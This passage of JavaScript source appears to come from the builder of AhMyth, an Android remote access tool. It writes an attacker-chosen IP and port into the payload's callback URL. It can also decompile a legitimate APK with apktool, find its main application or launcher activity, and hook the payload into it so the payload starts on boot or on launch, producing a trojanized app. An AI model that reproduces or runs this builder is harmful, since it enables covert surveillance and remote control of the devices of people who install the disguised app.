                                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                        return;
                                    }

                                    delayedLog('[★] Modifying the Min & Max SDK Versions')
                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                    var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                        .replace(tarSdkRegex, "$122'");

                                    fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            delayedLog('[x] Unable to Modify the Target SDK Version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                            writeErrorLog(error, 'Writing.log');
                                            delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                            return;
                                        }

                                        $appCtrl.copyAhmythFilesAndGenerateApk(apkFolder);
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    };

    // fired when user click build buttom
    // collect the ip and port input and start building
    $appCtrl.Build = (ip, port) => {
        // Check Java version before proceeding
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] Please Install any version of Java 8 upto 21 to Use This Feature.', CONSTANTS.logStatus.INFO);
                return;
            } else if (parseFloat(javaVersion) < 1.8 || parseFloat(javaVersion) >= 22) {
                // excludes any java version less than 8 or greater than or equal to 22
                $appCtrl.Log(`[x] Unsupported Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] AhMyth Requires any Version of Java 8 through 21 to use This Feature.', CONSTANTS.logStatus.INFO);
                return;
            } else {
                if (!ip) {
                    $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
                    return;
                }
                if (!port) {
                    port = CONSTANTS.defaultPort;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);
                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }
                            $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                        });
                    });
                } else {
                    var filePath = $appCtrl.filePath;
                    if (!filePath) {
                        $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
                        return;
                    }
                    if (!filePath.includes(".apk")) {
                        $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);

                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // generate a solid ahmyth apk
                            var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                            var apkName = dir.basename(apkFolder) + ".apk";
                            delayedLog('[★] ' + 'Decompiling ' + '"' + apkName + '"' + "...");

                            var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

                            exec(decompileApk, (error, stdout, stderr) => {
                                if (error !== null) {
                                    delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                                    writeErrorLog(error, 'Decompiling');
                                    delayedLog('[¡] Error Written to "Decompiling.log" on', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                if ($appCtrl.bindApk.method == 'BOOT')
                                    $appCtrl.bindOnBoot(apkFolder);

                                else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                    $appCtrl.bindOnActivity(apkFolder);

                            });
                        });
                    });
                }
            }
        });
    };
});

// Function to get Wi-Fi IP address
function getWiFiIP() {
    const networkInterfaces = os.networkInterfaces();
    for (let interfaceName in networkInterfaces) {
        if (interfaceName.toLowerCase().includes('wi-fi')) { // Specifically look for 'Wi-Fi'
            for (let iface of networkInterfaces[interfaceName]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    }
    // If no IP address is found, return null to indicate failure
    return null;
}

// Function to check if Java version 11 is installed
function checkJavaVersion(callback) {
    exec('java -version',
        (error, stdout, stderr) => {
            if (error) {
                callback(new Error('Java is not installed or not accessible.'));
            } else {
                const versionOutput = stderr || stdout;
                const versionMatch = versionOutput.match(/version "([^"]+)"/);
                if (versionMatch) {
                    const versionString = versionMatch[1];
                    callback(null, versionString);
                } else {
                    callback(new Error('Java is not installed or not accessible.'));
                }
            }
        });
}

// function to delay logs by 0300
function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    },
        count * 0o300);
};

function writeErrorLog(errorMessage, errorType) {
    // Check if the log directory exists, if not then create it
    if (!fs.existsSync(logPath)) {
        fs.mkdirSync(logPath);
    }

    // Write the error to the appropriate log file based on the error type
    switch (errorType) {
        case 'Parsing':
            fs.appendFileSync(dir.join(logPath, 'Parsing.log'), errorMessage + '\n');
            break;

        case 'Reading':
            fs.appendFileSync(dir.join(logPath, 'Reading.log'), errorMessage + '\n');
            break;

        case 'Writing':
            fs.appendFileSync(dir.join(logPath, 'Writing.log'), errorMessage + '\n');
            break;

        case 'Building':
            fs.appendFileSync(dir.join(logPath, 'Building.log'), errorMessage + '\n');
            break;

        case 'Signing':
            fs.appendFileSync(dir.join(logPath, 'Signing.log'), errorMessage + '\n');
            break;

        case 'Decompiling':
            fs.appendFileSync(dir.join(logPath, 'Decompiling.log'), errorMessage + '\n');
            break;

        case 'IP:PORT':
            fs.appendFileSync(dir.join(logPath, 'IP-PORT.log'), errorMessage + '\n');
            break;

        case 'Copying':
            fs.appendFileSync(dir.join(logPath, 'Copying.log'), errorMessage + '\n');
            break;

        default:
            // If the error type is not recognized, write it to a generic error log file
            fs.appendFileSync(dir.join(logPath, 'Error.log'), errorMessage + '\n');
            break;
    }
}

/**
 * Processes a fully qualified class name and returns the final segment with a .smali extension.
 * @param {string} className
 * @returns {string|null}
 */
function processClassName(className) {
    if (!className) return null;
    return `${className.split('.').pop()}.smali`;
}

/**
 * Checks whether the provided class name belongs to a known system package.
 * @param {string} className
 * @returns {boolean}
 */
const systemClassPrefixes = ['android.app', 'androidx', 'android.support', 'android.view', 'android.content'];
function isSystemClass(className) {
    return systemClassPrefixes.some(prefix => className.startsWith(prefix));
}

/**
 * Determines if an element is enabled (i.e. its "android:enabled" attribute is not "false").
 * @param {Element} element
 * @returns {boolean}
 */
function isEnabled(element) {
    const enabled = element.getAttribute('android:enabled');
    return enabled !== 'false';
}

/**
 * Checks if an <intent-filter> element qualifies as a launcher (contains the MAIN action and LAUNCHER category).
 * @param {Element} intentFilterEl
 * @returns {boolean}
 */
function isLauncherIntentFilter(intentFilterEl) {
    // Use XPath to look for an <action> with the MAIN action and a <category> with the LAUNCHER category.
    const action = xpath.select1("action[@android:name='android.intent.action.MAIN']", intentFilterEl);
    const category = xpath.select1("category[@android:name='android.intent.category.LAUNCHER']", intentFilterEl);
    return !!(action && category);
}

/**
 * Returns the highest android:priority among an element's <intent-filter> children.
 * @param {Element} element
 * @returns {number}
 */
function getHighestPriority(element) {
    const intentFilters = xpath.select("intent-filter", element);
    let max = 0;
    intentFilters.forEach(filter => {
        const priorityStr = filter.getAttribute('android:priority');
        const priority = priorityStr ? parseInt(priorityStr, 10) : 0;
        if (priority > max) max = priority;
    });
    return max;
}

/**
 * Locates the main application or launcher activity class in the manifest DOM.
 * @param {Document} doc - The manifest DOM Document.
 * @returns {object|null} - An object with properties { className, type } or null if not found.
 */
function getLauncherActivity(doc) {
    delayedLog('[★] Attempting to Locate the Main Application Class (DOM)...');

    // Get the <application> element.
    const appEl = xpath.select1('/manifest/application', doc);
    if (!appEl) {
        delayedLog('[!] No <application> tag found in manifest.', CONSTANTS.logStatus.ERROR);
        return null;
    }

    // Get the package name from the <manifest> element.
    const packageName = doc.documentElement.getAttribute('package');
    if (!packageName) {
        delayedLog('[!] No package name found in manifest. Invalid manifest.', CONSTANTS.logStatus.ERROR);
        return null;
    }

    // Check for a main application class defined in the <application> tag.
    const mainApplicationClassName = appEl.getAttribute('android:name');
    if (mainApplicationClassName) {
        if (!isSystemClass(mainApplicationClassName)) {
            delayedLog(`[¡] Found Main Application Class: ${mainApplicationClassName}`, CONSTANTS.logStatus.INFO);
            return { className: processClassName(mainApplicationClassName), type: 'application' };
        } else {
            delayedLog('[!] Main Application Class is a System Class or Invalid.', CONSTANTS.logStatus.WARNING);
        }
    } else {
        delayedLog('[!] No Main Application Class Found.', CONSTANTS.logStatus.INFO);
    }

    delayedLog('[★] Attempting to Locate the Main Launcher Activity Class (DOM)...');
    // Search for <activity> nodes within the <application>.
    const activityNodes = xpath.select('activity', appEl);
    const launcherActivities = activityNodes.filter(activity => {
        if (!isEnabled(activity)) return false;
        const intentFilters = xpath.select('intent-filter', activity);
        return intentFilters.some(filter => isLauncherIntentFilter(filter));
    });

    if (launcherActivities.length > 0) {
        // Sort launcher activities based on their highest android:priority.
        launcherActivities.sort((a, b) => getHighestPriority(b) - getHighestPriority(a));
        const mainActivityClassName = launcherActivities[0].getAttribute('android:name');
        if (mainActivityClassName && !isSystemClass(mainActivityClassName)) {
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return { className: processClassName(mainActivityClassName), type: 'launcher' };
        } else {
            delayedLog('[!] Main Launcher Activity Class is a System Class or Invalid.', CONSTANTS.logStatus.WARNING);
        }
    } else {
        delayedLog('[!] No Main Launcher Activity Class Found.', CONSTANTS.logStatus.ERROR);
    }

    delayedLog('[i] Checking activity aliases (DOM)...', CONSTANTS.logStatus.INFO);
    const aliasNodes = xpath.select('activity-alias', appEl);
    const validAliases = [];
    const targetActivities = new Set();

    aliasNodes.forEach(alias => {
        if (!isEnabled(alias)) return;
        const intentFilters = xpath.select('intent-filter', alias);
        const isLauncherAlias = intentFilters.some(filter => isLauncherIntentFilter(filter));
        if (isLauncherAlias) {
            const targetActivityName = alias.getAttribute('android:targetActivity');
            if (targetActivityName && targetActivityName.trim() !== '') {
                const processed = processClassName(targetActivityName);
                const withoutExtension = processed.replace('.smali', '');
                if (!targetActivities.has(withoutExtension)) {
                    targetActivities.add(withoutExtension);
                    validAliases.push(processed);
                    delayedLog(`[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking: ${processed}`, CONSTANTS.logStatus.INFO);
                }
            } else {
                delayedLog('[!] Invalid or missing targetActivity in alias.', CONSTANTS.logStatus.WARNING);
            }
        }
    });

    if (validAliases.length > 0) {
        return { className: validAliases[0], type: 'launcher' };
    } else {
        delayedLog('[!] No Main Launcher Activity Class Found in Aliases.', CONSTANTS.logStatus.WARNING);
    }

    return null;
}

/**
* Searches for the launcher activity file within the specified APK folder.
* @param {string} launcherActivity - The launcher activity file name to search for (e.g., 'MainActivity.smali').
* @param {string} apkFolder - The directory path to search within.
* @param {string} classType - The type of class (Main Application Class or Main Launcher Activity Class).
* @param {function} callback - The callback function to handle the result or error.
*/
function getLauncherPath(launcherActivity, apkFolder, classType, callback) {
    let launcherPath = null;
    let found = false;

    const stream = readdirp(apkFolder, {
        fileFilter: (entry) => {
            // Allow partial matching and ignore inner classes (no '$')
            return entry.basename.includes(launcherActivity) && !entry.basename.includes('$');
        },
        alwaysStat: true
    });

    stream
        .on('data', (entry) => {
            if (!found) {
                found = true;
                launcherPath = JSON.stringify(entry.path).replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
            }
        })
        .on('end', () => {
            if (!found) {
                const errorMessage = `Unable to locate the ${classType} file! Please use the "On Boot" method!`;
                callback(new Error(errorMessage)); // Ensure callback is invoked with an error
            } else {
                callback(null, launcherPath); // Ensure callback is invoked with the launcherPath
            }
        })
        .on('error', (err) => {
            callback(err); // Ensure callback is invoked on error
        });
}